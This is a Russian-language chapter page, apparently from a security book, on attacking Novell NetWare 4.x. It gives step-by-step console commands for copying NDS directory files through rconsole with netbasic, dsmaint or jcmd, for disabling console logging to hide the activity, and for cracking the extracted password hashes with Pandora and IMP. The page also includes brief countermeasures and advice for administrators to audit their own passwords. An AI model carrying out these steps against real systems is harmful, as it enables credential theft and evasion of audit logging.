<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
</head>
<link rel="stylesheet" href="../STYLE.css">
<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
<table BORDER=0   COLS=3 WIDTH="16%" >
  <tr> 
    <td><a href="Index9.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index11.html"><img SRC="For.gif" BORDER=0 ></a></td>
  </tr>
</table>

 
<br>
<table width="100%" border="0">
  <tr>
    <td class="Text_n">
 
<p class="Tit_CN">

Получение доступа к файлам NDS</P>

<p class="Text_n">
После приобретения пароля утилиты rconsole осталось выполнить завершающий шаг — получить доступ к файлам NDS. В системе NetWare файлы NDS содержатся в скрытом каталоге _netware тома SYS. Доступ к этому каталогу можно получить лишь через доступ к консоли (для взломщика — утилите rconsole). Для &quot;захвата&quot; файлов NDS существует много методов. И как вы скоро убедитесь, у каждого взломщика имеются свои любимые приемы.
<br>
<P align="center">
<span class="Text_b">
netbasic. nlm (SYS: SYSTEM)</span></P>
<br>
<p class="Text_n">
Набор средств разработки программного обеспечения NetBasic представляет собой язык сценариев, который изначально был разработан компанией High Technology Software Corp. (для краткости HiTecSoft). С его помощью можно конвертировать сценарии NetBasic в формат NLM (NetWare Loadable Module) компании Novell и использовать их на Web-сервере системы NetWare. Компонент netbasic.nlm имеет уникальную особенность, которая изначально была обнаружена взломщиками: с его помощью из командной строки можно про смотреть весь том, включая скрытый каталог
_netware.
<br>

Средства NetBasic по умолчанию устанавливаются на всех серверах NetWare 4.x, так что их очень часто используют для получения доступа к файлам NDS. Для этого выполните следующую последовательность действий и команд.
<br>

1.   С помощью команды SYS: \PUBLlc\rconsole получите доступ к консоли rconsole.
<br>

2. <span class="Text_b">  unload conlog </span> (удаляет утилиту, регистрирующую консольные сообщения, и отключает режим регистрации).
<br>

3. <span class="Text_b"> load netbasic.nlm.</span>
<br>

4. <span class="Text_b">shell</span>.
<br>

5. <span class="Text_b"> cd \_netware</span> (скрытый системный каталог, который можно увидеть только с  системной консоли).
<br>

6.<span class="Text_b"> md \login\nds.</span>
<br>

7. <span class="Text_b"> copy block.nds \login\nds\block.nds.</span>
<br>

8. <span class="Text_b"> copy entry.nds \login\nds\entry.nds.</span>
<br>

9. <span class="Text_b"> copy partitio.nds \login\nds\partitio.nds.</span>
<br>

10. <span class="Text_b"> copy value.nds \login\nds\value.nd</span>s.
<br>

11. <span class="Text_b"> exit</span> (выход из оболочки).
<br>

12.<span class="Text_b"> unload netbasic.</span>
<br>

13. <span class="Text_b"> load conlog</span> (вновь загружаем утилиту регистрации).
<br>

14. Со стороны клиента воспользуйтесь командой
mар, чтобы подключить сетевой диск, указав путь к созданному ранее каталогу LOGINXNDS.
<br>

15. Скопируйте файлы * .NDS на свой локальный компьютер.
<br>

16. Приступайте к взлому.
<br>
<P align="center">
<span class="Text_b">
dsmaint</span></P>
<br>
<p class="Text_n">
Может оказаться, что на целевом сервере язык сценариев NetBasic не установлен. В этом случае придется воспользоваться альтернативным средством — dsmaint. Этот модуль NLM не является стандартным компонентом NetWare 4.11, однако его можно загрузить с Web-узла компании Novell<span class="Text_b"> http://www.
support.novell.com</span>. Файл называется DS411P.EXE. Однако будьте осторожны: при использовании компонента dsmaint работа службы каталога будет автоматически завершена, так что не стоит использовать его в рабочее время. Для того чтобы вернуться к исходному состоянию службы каталогов, необходимо запустить процесс восстановления. Другими словами, эти действия лучше не выполнять на рабочем сервере.
<br>

1.   Подключите сетевой диск, указав каталог SYS: SYSTEM.
<br>

2.  Скопируйте на сетевой диск модуль dsmaint. nlm.
<br>

3.   С помощью команды rconsole получите доступ к виртуальной консоли.
<br>

4.<span class="Text_b">   unload conlog</span> (удаляет утилиту, регистрирующую консольные сообщения, и отключает режим регистрации).
<br>

5. Введите команду <span class="Text_b">load dsmaint.</span>
<br>

6. Выберите команду Prepare NDS For Hardware Upgrade.
<br>

7. Зарегистрируйтесь в качестве администратора.
<br>

&nbsp;В этот момент будет выгружена служба каталогов.
<br>

После этого в каталоге SYS: SYSTEM будет автоматически сохранен файл backup.nds.
<br>

1.   Выберите команду Restore NDS Following Hardware Upgrade.
<br>

2.   Введите команду <span class="Text_b"> load conlog</span>.
<br>

3.   Co   стороны   клиента   подключите   сетевой   диск,   указав   путь   к   каталогу
SYS:SYSTEM.
<br>

4.   Скопируйте файл backup. nds на свой локальный компьютер.
<br>

5.   Воспользуйтесь утилитой extract из набора Pandora и создайте четыре файла NDS (block, entry, partitio и value).
<br>

6.   Приступайте к взлому.
<br>

Более старый загружаемый модуль dsrepair.nlm также предоставляет возможность подготовиться к обновлению аппаратного обеспечения. При этом в каталоге SYS: SYSTEM тоже будут созданы резервные копии файлов NDS. Однако этот модуль можно использовать только в более ранних версиях системы NetWare 4.x и, кроме того, он абсолютно не пригоден для применения в системах, в которых установлены пакеты обновления.
<br>
<P align="center">
<span class="Text_b">
jcmd</span></P>
<br>
<p class="Text_n">
За последние шесть лет компания JRB Software Limited разработала прекрасные утилиты для системы NetWare, многие из которых можно применять для аудита ее системы безопасности. Однако в отличие от сценариев NetBasic, утилита jcmd не позволяет скопировать открытые файлы NDS. Так что, как и модуль dsmaint.nlm, ее не рекомендуется устанавливать на рабочем сервере. Для обхода этого ограничения необходимо выгрузить службу каталогов. Чтобы скопировать файлы NDS с помощью утилиты jcmd, выполните следующие действия.
<br>

1. Подключите сетевой диск, указав путь к каталогу SYS : SYSTEM.
<br>

2. Скопируйте на сетевой диск модуль jcmd.nlm.
<br>

3. С помощью команды rconsole получите доступ к виртуальной консоли.
<br>

4. <span class="Text_b">  unload conlog</span> (удаляет утилиту, регистрирующую консольные сообщения, и отключает режим регистрации).
<br>

5.<span class="Text_b">  unload ds.</span>
<br>

6.<span class="Text_b">   load jcmd</span>
<br>

7. <span class="Text_b">   cd \_netware </span> (на экране появится информация, представленная на следующем рисунке).


<p class="label"><IMG src="15.gif" ><br>
</p>

 <p class="Text_n">
8. <span class="Text_b">  dir *.*</span> (для того чтобы с помощью модуля jcmd увидеть имена файлов, нужно использовать символы шаблона)
<br>

9. <span class="Text_b">  md \login\nds.</span>
<br>

10. <span class="Text_b"> copy block.nds \login\nds</span>.
<br>

11.<span class="Text_b"> copy entry.nds \login\nds.</span>
<br>

12. <span class="Text_b"> copy partitio.nds \login\nds.</span>
<br>

13<span class="Text_b">. copy value.nds \Iogin\nds.</span>
<br>

14. <span class="Text_b"> exit </span> (выход из оболочки).
<br>

15.<span class="Text_b"> load ds.</span>
<br>

16. <span class="Text_b"> load conlog.</span>
<br>

17. Co стороны клиента воспользуйтесь командой map и подключите сетевой диск, указав путь к каталогу LOGIN\NDS.
<br>

18. Скопируйте файлы * .NDS на свой локальный компьютер.
<br>

19. Приступайте к взлому.
<br>
<P align="center">
<span class="Text_b">Контрмеры против &quot;захвата&quot; файлов NDS</span></P>
<br>
<p class="Text_n">
Меры защиты против &quot;захвата&quot; данных NDS сводятся к уменьшению количества средств, которые могут быть для этого использованы.
<br>

1.   Зашифруйте пароль утилиты rconsole, как описывалось выше.
<br>

2.  Удалите модуль netbasic.nlm из каталога SYS: \SYSTEM и примените к этому каталогу утилиту purge. Как правило, этот модуль оказывается ненужным.
<br>
<P align="center">
<span class="Text_b">
Взлом файлов NDS</span></P>
<br>
<p class="Text_n">
Как только взломщики смогли скопировать файлы NDS, можно считать, что они выполнили большую часть поставленной задачи. Сделайте все возможное, чтобы не допустить этого. Как только получены файлы NDS, взломщики, скорее всего, предпримут попытку взломать эти файлы, воспользовавшись специальными средствами. Для этого подойдет любая из свободно распространяемых программ, например IMP, разработанная Шейдом (Shade), или утилиты crypto/crypto2 из пакета Pandora.
<br>

С точки зрения администратора, совсем не лишним будет загрузить свои собственные файлы NDS, воспользовавшись описанными выше приемами, а затем попробовать их взломать. При этом можно применить очень большой файл словаря. Когда будет получен пароль пользователя, его можно уведомить об этом и попросить, чтобы пароль был изменен. Помимо реализованной политики аудита подобные изыскания могут оказаться очень информативными и позволят оценить промежуток времени, в течение которого относительно безопасно использовать одни и те же пароли.
<br>

Для взлома файлов NDS могут пригодиться также утилиты crypto и crypto2. Кроме того, их можно применять для взлома с использованием словаря. Для того чтобы приступить к взлому, выполните следующие действия.
<br>

1.   Скопируйте файл backup.nds или backup.ds в каталог \PANDORA\EXE.
<br>

2.   С помощью утилиты extract извлеките из файла backup.nds четыре файла NDS.
<span class="Text_b"> extract -d</span>
<br>

3.  Для извлечения из файлов NDS хэш-кодов паролей и создания файла password.nds снова воспользуйтесь утилитой extract, как показано на следующем рисунке.
<span class="Text_b">extract -n</span>


<p class="label"><IMG src="16.gif" ><br>
</p>

 <p class="Text_n">
4.   Запустите утилиту crypto или crypto2 для взлома файла password.nds  &quot;в лоб&quot; или с использованием словаря, как показано на следующем рисунке.
<br>

<span class="Text_b">
crypto -u Admin</span>
<br>

<span class="Text_b">&nbsp;cryptoZ dict.txt —u deoane</span>


<p class="label"><IMG src="17.gif"><br></p>

 <p class="Text_n">
<P align="center">
<span class="Text_b">
IMP 2.0</span></P>
<br>
<p class="Text_n">
Программа IMP, разработанная Шейдом (Shade), имеет графический интерфейс и позволяет использовать оба режима: прямого взлома и с использованием словаря. Второй режим оказывается чрезвычайно быстрым: при использовании словаря размером 933,224 слов весь процесс на компьютере Pentium с частотой 200 МГц занимает лишь несколько минут. Единственным ограничением программы IMP является то, что пароли всех учетных записей должны иметь одну и ту же длину (к счастью, IMP рядом с именем пользователя отображает и длину пароля).
<br>

Программу IMP можно найти по адресу<span class="Text_b"> http: //www. wastelands
.gen.nz/</span>.
<br>

К четырем файлам NDS, скопированным с помощью сценария NetBasic или сгенерированным с использованием утилиты extract из пакета Pandora, относятся файлы block.nds, entry.nds, partitio.nds и value.nds. Для того чтобы приступить к взлому, достаточно иметь в своем распоряжении лишь файл partitio.nds. Запустите программу IMP и загрузите файл с диска. Затем установите требуемый режим и запустите процесс на выполнение.
<br>

В диалоговом окне программы IMP отобразится полное дерево с каждым пользователем и длиной его пароля, как видно из рис. 7.8. Эта информация важна по двум следующим причинам.
<br>
<ul>
  <li>&nbsp;Эти данные помогут узнать, какой длины пароли используются пользователями.</li>
  <li>&nbsp;Вы сможете управлять процессом прямого взлома (который наверняка займет какое-то время) и направить атаку на получение лишь коротких паролей (до семи или восьми символов).</li>
</ul>

<p class="label"><IMG src="18.gif"  ><br>
<br>
Рис. 7.8. Программа IMP предоставляет важную информацию, которая помогает осуществлять направленные атаки</p>


</p></td>
  </tr>
</table>
<br>
<table BORDER=0  COLS=3 WIDTH="11%" >
  <tr> 
   <td><a href="Index9.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index11.html"><img SRC="For.gif" BORDER=0 ></a></td>
   
  </tr>
</table>
</body>
</html>
